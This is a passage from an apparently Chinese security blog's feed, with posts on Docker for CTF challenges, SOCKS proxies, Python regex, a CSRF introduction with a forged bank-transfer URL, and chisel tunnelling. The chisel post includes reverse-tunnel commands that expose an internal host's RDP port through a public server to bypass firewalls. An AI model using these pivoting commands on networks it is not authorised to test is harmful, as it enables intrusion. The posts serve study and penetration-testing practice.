class="line">这一串数字为容器ID</span><br></pre></td></tr></table></figure><p>上传本地文件到容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp &#x2F;home&#x2F;test&#x2F;2019JNUCTF&#x2F;Web&#x2F;easyupload&#x2F; cb0bc63b1ebbec1258c9eb:&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">容器ID可以不用写全，只写前面几位也是可以的</span><br></pre></td></tr></table></figure><p>访问 <code>ip:8888/easyupload</code> 成功。<br><img src="/posts/11960/1.png" alt></p><h2 id="0x03-Dockerfile"><a href="#0x03-Dockerfile" class="headerlink" title="0x03 Dockerfile"></a>0x03 Dockerfile</h2><p>我们可以把构建一道题目的过程分为以下具体三步。</p><ol><li>指定具体要使用的镜像</li><li>启动镜像，构建一个容器</li><li>移入相关的源码，构建容器里面的环境配置<br>在上面的实例中，我们第三步里面需要进行的操作只有把源码移入/var/www/html文件夹里面而已，但如果环境配置较为复杂，比如需要构建数据库，安装各种插件等，第三步需要的时间就太长了。如果我们改变下上面的步骤。变成：</li><li>指定使用的镜像</li><li>配置相关的环境，移入相关的代码</li><li>根据第二步的内容，把这些操作以类似于代码，程序的模式写入一个模板，让Docker根据这个模板来生成新的镜像</li><li>根据这个新的镜像来生成新的容器<br>如果是这么操作的话，带来的好处就是可以方便的构造出一个针对性的镜像。配置题目的时候，我们只需要根据这个我们创作的模板生成特制的镜像，直接按照这个镜像就可以直接生成环境了。这个需要的模板就是<code>Dockerfile</code>。<br><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。<br><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用-f标志指向文件系统中任何位置的<code>Dockerfile</code>。<br><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，<code>#</code> 为 Dockerfile 中的注释。<br>Docker以从上到下的顺序运行<code>Dockerfile</code>的指令。为了指定基本映像，第一条指令必须是<code>FROM</code>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</li></ol><p><strong>常用指令</strong><br>FROM： 指定基础镜像，必须为第一个命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line">例：</span><br><span class="line">  FROM php:5.6</span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><p>MAINTAINER: 维护者信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">    MAINTAINER zhangsan</span><br><span class="line">MAINTAINER 123@163.com</span><br></pre></td></tr></table></figure><p>RUN: 构建镜像时执行的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：</span><br><span class="line">shell执行</span><br><span class="line">RUN &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">RUN [&quot;executable&quot;, &quot;paraml&quot;, &quot;param2&quot;]</span><br><span class="line">RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</span><br></pre></td></tr></table></figure><p>ADD: 将本地文件添加到容器中，tar类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似wget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADD &lt;src&gt; ... &lt;dest&gt;</span><br><span class="line">ADD [&quot;&lt;src&gt;&quot;, ... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径</span><br><span class="line">例：</span><br><span class="line">ADD hom* &#x2F;mydir&#x2F;  # 添加所有以 hom 开头的文件</span><br><span class="line">ADD hom?.txt &#x2F;mydir&#x2F;  # ?替代一个单字符，例如，home.txt</span><br><span class="line">ADD test mydir&#x2F;  # 添加test到mydir</span><br></pre></td></tr></table></figure><p>COPY: 功能类似ADD，但是不会自动解压文件，也不能访问网络资源<br>CMD: 构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] # 执行可执行文件，优先</span><br><span class="line">CMD [&quot;param1&quot;,&quot;param2&quot;]  # 设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数</span><br><span class="line">CMD command param1 param2  # 执行shell内部命令</span><br><span class="line"></span><br><span class="line">CMD echo &quot;This is a test.&quot; | wc -</span><br><span class="line">CMD [&quot;&#x2F;usr&#x2F;bin&#x2F;wc&quot;,&quot;--help&quot;]</span><br><span class="line"></span><br><span class="line">CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></pre></td></tr></table></figure><p>ENTRYPOINT: 配置容器，使其可执行化。配合CMD可省去 application，只使用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]  # 可执行文件，优先</span><br><span class="line">ENTRYPOINT command param1 param2  # shell内部命令</span><br><span class="line">ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</span><br></pre></td></tr></table></figure><p>LABEL: 用于为镜像添加元数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; ...</span><br><span class="line">LABEL version&#x3D;&quot;1.0&quot; description&#x3D;&quot;this is a test&quot; by&#x3D;&quot;ca5tle&quot;</span><br><span class="line">使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</span><br></pre></td></tr></table></figure><p>ENV: 设置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;  # &lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此一次只能设置一个变量</span><br><span class="line">ENV &lt;key&gt;&#x3D;&lt;value&gt; ... # 可以设置多个变量，每个变量为一个&lt;key&gt;&#x3D;&lt;value&gt;的键值对，如果&lt;key&gt;中包含空格，可以使用 \ 来进行转义，也可以用&quot;&quot;表示，另外 \ 也可以用于续行</span><br></pre></td></tr></table></figure><p>EXPOSE: 指定外界交互的端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来映射端口</span><br></pre></td></tr></table></figure><p>VOLUME: 用于指定持久化目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;&#x2F;path&#x2F;to&#x2F;dir&quot;]</span><br><span class="line">一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="line">1. 卷可以容器间共享和重用</span><br><span class="line">2. 容器并不一定要和其他容器共享卷</span><br><span class="line">3. 修改卷后会立即生效</span><br><span class="line">4. 对卷的修改不会对镜像产生影响</span><br><span class="line">5. 卷会一直存在，直到没有任何容器在使用它</span><br></pre></td></tr></table></figure><p>USER: 指定运行容器时的用户名或UID，后续的RUN也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或者是两者组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USER user</span><br><span class="line">USER user:group</span><br><span class="line">USER uidU</span><br><span class="line">SER uid:gid</span><br><span class="line">USER user:gid</span><br><span class="line">USER uid:group</span><br><span class="line">使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。</span><br></pre></td></tr></table></figure><p>ARG: 用于指定传递给构建运行时的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;name&gt;</span><br></pre></td></tr></table></figure><p>ONBUILD: 用于设置镜像触发器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br><span class="line">例：</span><br><span class="line">ONBUILD ADD . &#x2F;app&#x2F;src</span><br><span class="line">当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wt7018/p/
      
    
    </summary>
    
    
      <category term="Docker" scheme="http://mysecroad.github.io/categories/Docker/"/>
    
    
      <category term="docker" scheme="http://mysecroad.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>SOCKS代理</title>
    <link href="http://mysecroad.github.io/posts/15027.html"/>
    <id>http://mysecroad.github.io/posts/15027.html</id>
    <published>2020-10-20T11:40:26.000Z</published>
    <updated>2020-10-21T10:31:52.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型： SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP、UDP协议，还支持各种身份验证机制等，其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可以理解为加强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时尽可能选择没有GUI界面的。尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的更好。</p><p>常见的内网渗透测试环境：<br>Internet –&gt; 防火墙 –&gt; 边界 –&gt; 防火墙 –&gt; 受限区域</p><h2 id="0x01-代理工具"><a href="#0x01-代理工具" class="headerlink" title="0x01 代理工具"></a>0x01 代理工具</h2><ol><li>EarthWorm</li><li>reGeorg</li><li>sSocks</li><li>SocksCap64</li><li>Proxifier</li><li>ProxyChains</li><li>chisel</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、F
      
    
    </summary>
    
    
      <category term="内网" scheme="http://mysecroad.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="代理" scheme="http://mysecroad.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="http://mysecroad.github.io/posts/26030.html"/>
    <id>http://mysecroad.github.io/posts/26030.html</id>
    <published>2020-10-20T07:31:02.000Z</published>
    <updated>2020-10-20T09:21:38.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字<br><code>&#39;00\d&#39;</code>可以匹配<code>&#39;002&#39;</code>、<code>&#39;003&#39;</code>等，但是无法匹配<code>&#39;00a&#39;</code><br><code>&#39;\d\d\d&#39;</code>可以匹配长度为3的字符串或数字，比如<code>&#39;123&#39;</code>、<code>&#39;111&#39;</code>等<br><code>&#39;\w\w\d&#39;</code>可以匹配长度为3的字符串，比如<code>&#39;aa1&#39;</code>、<code>&#39;ds0&#39;</code>等<br><code>.</code>可以匹配任意一个字符，比如<code>&#39;ab.&#39;</code>可以匹配<code>&#39;ab1&#39;</code>、<code>&#39;abd&#39;</code>等</p><p>要匹配变长的字符，<br>用<code>*</code>表示任意个字符，包括0个，<br>用<code>+</code>表示至少一个字符，<br>用<code>?</code>表示0个或1个字符，<br>用<code>{n}</code>表示n个字符，<br>用<code>{n,m}</code>表示n-m个字符</p><p>例如，<code>\d{3}\s+\d{3,8}</code></p><ul><li><code>\d{3}</code>代表3个数字</li><li><code>\s</code>代表匹配一个空格（包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格</li><li><code>\d{3,8}</code>表示3到8个数字</li></ul><p>综上，上面的正则表达式可以匹配前面3个数字，中间至少一个空格，后面3到8个数字的字符串</p><p>如果要匹配特殊字符，比如<code>-</code>，需要用<code>\</code>转义，即<code>\-</code></p><h2 id="0x01-进阶"><a href="#0x01-进阶" class="headerlink" title="0x01 进阶"></a>0x01 进阶</h2><p>要做到更精确的匹配，可以用<code>[]</code>表示范围</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、或一个字母或者一个下划线</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]{0,19}</code>更精确地限制了变量的长度是1-20个字符（前面一个字符+后面最多19个字符）</li></ul><p><code>A|B</code>可以匹配A或B<br><code>(P|p)ython</code>可以匹配<code>Python</code>或<code>python</code><br><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头<br><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结尾</p><h2 id="0x02-re模块"><a href="#0x02-re模块" class="headerlink" title="0x02 re模块"></a>0x02 re模块</h2><p>下面用Python的re库使用正则表达式<br>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &#39;abc\\-111&#39;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc\-111</span><br></pre></td></tr></table></figure><p>所以我们可以使用<code>r</code>前缀，原始字符串，不用考虑转义的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; r&#39;abc\-111&#39;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc-111</span><br></pre></td></tr></table></figure><p>判断正则表达式是否匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; re.match(r&#39;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#39;, &#39;010-12345&#39;)</span><br><span class="line">&lt;_sre.SRE_Match object; span&#x3D;(0, 9), match&#x3D;&#39;010-12345&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; re.match(r&#39;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#39;, &#39;010 12345&#39;)</span><br></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test &#x3D; &#39;用户输入的字符串&#39;</span><br><span class="line">if re.match(r&#39;正则表达式&#39;, test):</span><br><span class="line">    print(&#39;ok&#39;)</span><br><span class="line">else:</span><br><span class="line">    print(&#39;failed&#39;)</span><br></pre></td></tr></table></figure><h2 id="0x03-切分字符串"><a href="#0x03-切分字符串" class="headerlink" title="0x03 切分字符串"></a>0x03 切分字符串</h2><p>用正则表达式切片更加灵活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;a b     c&#39;.split(&#39; &#39;)</span><br><span class="line">[&#39;a&#39;, &#39;b&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;c&#39;]</span><br></pre></td></tr></table></figure><p>无法识别连续的空格，用正则表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss &#x3D; &#39;a b     c&#39;</span><br><span class="line">res &#x3D; re.split(r&#39;\s+&#39;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]</span><br></pre></td></tr></table></figure><p>切分空格、,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss &#x3D; &#39;a,b     c,d  e&#39;</span><br><span class="line">res &#x3D; re.split(r&#39;[\s\,]+&#39;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;]</span><br></pre></td></tr></table></figure><p>再加上<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss &#x3D; &#39;a,b     c;;d  e;test&#39;</span><br><span class="line">res &#x3D; re.split(r&#39;[\s\,\;]+&#39;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;test&#39;]</span><br></pre></td></tr></table></figure><h2 id="0x04-分组"><a href="#0x04-分组" class="headerlink" title="0x04 分组"></a>0x04 分组</h2><p>提取子串<br>用<code>()</code>表示的就是要提取的分组(Group)。<br><code>^(\d{3})-(\d{3,8})$</code>分别定义了两个组，可以直接从匹配的字符串中提取出两个字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &#39;010-5832360&#39;</span><br><span class="line">if re.match(r&#39;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#39;, str):</span><br><span class="line">    print(&quot;匹配成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;匹配失败&quot;)</span><br><span class="line">res &#x3D; re.match(r&#39;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#39;, str)</span><br><span class="line">print(res.group(0))</span><br><span class="line">print(res.group(1))</span><br><span class="line">print(res.group(2))</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">匹配成功</span><br><span class="line">010-5832360</span><br><span class="line">010</span><br><span class="line">5832360</span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来。</p><p>注意到group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串。</p><h2 id="0x05-贪婪匹配"><a href="#0x05-贪婪匹配" class="headerlink" title="0x05 贪婪匹配"></a>0x05 贪婪匹配</h2><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#39;^(\d+)(0*)$&#39;, &#39;102300&#39;).groups()</span><br><span class="line">(&#39;102300&#39;, &#39;&#39;)</span><br></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的0全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#39;^(\d+?)(0*)$&#39;, &#39;102300&#39;).groups()</span><br><span class="line">(&#39;1023&#39;, &#39;00&#39;)</span><br></pre></td></tr></table></figure><h2 id="0x06-写在最后"><a href="#0x06-写在最后" class="headerlink" title="0x06 写在最后"></a>0x06 写在最后</h2><p>正则表达式的内容绝不止这些，这些只是基本的用法。<br>后面会接着学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础&quot;&gt;&lt;/a&gt;0x00 基础&lt;/h2&gt;&lt;p&gt;正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则
      
    
    </summary>
    
    
      <category term="Python" scheme="http://mysecroad.github.io/categories/Python/"/>
    
    
      <category term="python" scheme="http://mysecroad.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CSRF从0到1</title>
    <link href="http://mysecroad.github.io/posts/65258.html"/>
    <id>http://mysecroad.github.io/posts/65258.html</id>
    <published>2020-05-22T07:07:47.000Z</published>
    <updated>2020-07-09T00:03:03.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。与 XSS 不同的是，XSS利用站点内的信任用户，而CSRF通过伪装成受信任用户请求受信任的网站，也就是攻击者盗用你的身份，以你的名义发送恶意请求。</p><p>CSRF能够做的事情包括以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账等。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>举个例子</strong></p><p>你想给某用户转账100元，单击“转账”按钮之后，发出的HTTP请求会与<code>http://www.xxbank.com/pay.php?user=xx&amp;money=100</code>类似。攻击者构造链接<code>http://www.xxbank.com/pay.php?user=hacker&amp;money=100</code>，当目标用户访问了该URL后，就会自动向hacker账号转账100元，而且这只涉及目标用户的操作，攻击者并没有获取目标用户的cookie或其他信息。</p><p>CSRF攻击过程有两个重点：</p><ul><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>chisel使用</title>
    <link href="http://mysecroad.github.io/posts/13593.html"/>
    <id>http://mysecroad.github.io/posts/13593.html</id>
    <published>2020-05-17T03:39:38.000Z</published>
    <updated>2020-05-17T09:23:07.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。</p><p>项目地址：<a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a></p><p><strong>Chisel 是一款Go语言编写开源的通信加密的用于绕过防火墙使用 HTTP? 协议进行传输的快速 TCP 隧道工具</strong></p><p>特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 使用方便</span><br><span class="line">- 高性能</span><br><span class="line">- 使用SSH协议的加密连接（通过crypto&#x2F;ssh）</span><br><span class="line">- 支持身份验证</span><br><span class="line">- 客户端自动重新连接</span><br><span class="line">- 客户端可以通过一个 TCP 连接创建多个隧道</span><br><span class="line">- 客户端可以创建 HTTP CONNECT 代理</span><br><span class="line">- 服务端可选择兼作反向代理</span><br><span class="line">- 服务端可选择创建 SOCKS5 代理</span><br><span class="line">- 支持反向端口转发</span><br></pre></td></tr></table></figure><p>关键是<code>Chisel</code>的服务器端和客户端集成在一块，这就很方便了，不想<code>frp</code>还需要配置。</p><p>但是，<code>Chisel</code>的缺点就是，它的文件比较大。</p><h2 id="使用-Chisel-反弹-Socks5-代理"><a href="#使用-Chisel-反弹-Socks5-代理" class="headerlink" title="使用 Chisel 反弹 Socks5 代理"></a>使用 Chisel 反弹 Socks5 代理</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 5555 --socks5  # 在本地 5555 端口启动 Socks5 服务</span><br></pre></td></tr></table></figure><p><strong>本地执行 chisel client</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client IP:5555 socks</span><br></pre></td></tr></table></figure><h2 id="Chisel-进行端口映射"><a href="#Chisel-进行端口映射" class="headerlink" title="Chisel 进行端口映射"></a>Chisel 进行端口映射</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 1337 --reverse</span><br></pre></td></tr></table></figure><p><strong>内网主机上启动 chisel client</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chisel client WANIP:1337 R:1234:LANIP:3389</span><br><span class="line">WANIP 是公网主机的公网 IP，LANIP 是内网主机的内网 